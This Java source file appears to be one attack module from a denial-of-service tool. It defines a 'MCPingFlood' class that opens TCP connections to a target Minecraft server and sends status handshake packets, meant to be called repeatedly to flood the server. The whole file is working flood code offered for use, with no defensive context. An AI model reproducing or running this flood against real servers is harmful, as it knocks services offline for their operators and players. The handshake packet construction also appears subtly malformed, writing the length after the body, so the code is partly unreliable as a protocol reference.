package ir.xenoncommunity.jss.methods.impl;

import ir.xenoncommunity.jss.methods.IAttackMethod;
import ir.xenoncommunity.jss.utils.AttackStatics;
import ir.xenoncommunity.jss.utils.SocketUtils;
import lombok.RequiredArgsConstructor;
import lombok.val;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.StandardSocketOptions;
import java.nio.charset.StandardCharsets;

@RequiredArgsConstructor

public class MCPingFlood implements IAttackMethod {
    private final AttackStatics statics;

    /**
     * Sends data to the specified address and port.
     *
     * @param addr The destination IP address
     * @param port The destination port
     * @throws Exception If an error occurs during the sending process
     */
    @Override
    public void send(final InetAddress addr, final int port) throws Exception {
        // Check if the limit is reached
        if (statics.isLimitReached()) return;

        try (val socket = new Socket(addr, port);
             val buffer = new ByteArrayOutputStream();
             val bufferStream = new DataOutputStream(buffer)) {

                // If the socket is not connected, return
                if (!socket.isConnected()) return;

                // Enable socket options
                SocketUtils.enableSocketOpts(socket,
                        StandardSocketOptions.TCP_NODELAY,
                        StandardSocketOptions.SO_KEEPALIVE);
                // Set socket timeout
                SocketUtils.setSoTimeout(socket, 1000);

                // Write handshake data to the buffer
                writeHandshake(bufferStream, addr, port);
                // Write buffer to the output stream
                writePacket(new DataOutputStream(socket.getOutputStream()), buffer);
        }
    }

    /**
     * Writes a handshake packet to the buffer stream.
     *
     * @param bufferStream The data output stream to write to
     * @param addr         The server address
     * @param port         The server port
     * @throws IOException If an I/O error occurs
     */
    private void writeHandshake(final DataOutputStream bufferStream, final InetAddress addr, final int port) throws IOException {
        writeVarInt(bufferStream, 0x00); // Writing packet ID
        writeVarInt(bufferStream, 754); // Writing protocol version
        writeString(bufferStream, addr.getHostAddress()); // Writing server address
        bufferStream.writeShort(port); // Writing server port
        writeVarInt(bufferStream, 1); // Writing next state (1 for status)
        writeVarInt(bufferStream, bufferStream.size()); // Writing packet length
    }

    /**
     * Write the contents of the buffer to the output stream and flush the stream.
     *
     * @param outputStream the output stream to write to
     * @param buffer       the buffer containing the data to write
     * @throws IOException if an I/O error occurs
     */
    private void writePacket(final DataOutputStream outputStream, final ByteArrayOutputStream buffer) throws IOException {
        outputStream.write(buffer.toByteArray());
        outputStream.flush();
    }

    /**
     * Writes an integer value to the given DataOutputStream using variable-length encoding.
     *
     * @param out   the DataOutputStream to write to
     * @param value the integer value to write
     * @throws IOException if an I/O error occurs
     */
    private void writeVarInt(final DataOutputStream out, int value) throws IOException {
        do {
            // Extract the lowest 7 bits of the value
            var temp = (byte) (value & 0b01111111);
            // Shift the value to the right by 7 bits
            value >>>= 7;
            // If there are still more bits in the value, set the highest bit in temp
            if (value != 0) {
                temp |= (byte) 0b10000000;
            }
            // Write the byte to the DataOutputStream
            out.writeByte(temp);
        } while (value != 0);
    }

    /**
     * Writes a string to the specified DataOutputStream.
     *
     * @param out    the DataOutputStream to write to
     * @param string the string to write
     * @throws IOException if an I/O error occurs
     */
    private void writeString(final DataOutputStream out, final String string) throws IOException {
        // Convert the string to bytes using UTF-8 encoding
        val bytes = string.getBytes(StandardCharsets.UTF_8);

        // Write the length of the byte array as a minecraft varint
        writeVarInt(out, bytes.length);

        // Write the byte array to the output stream
        out.write(bytes);
    }
}
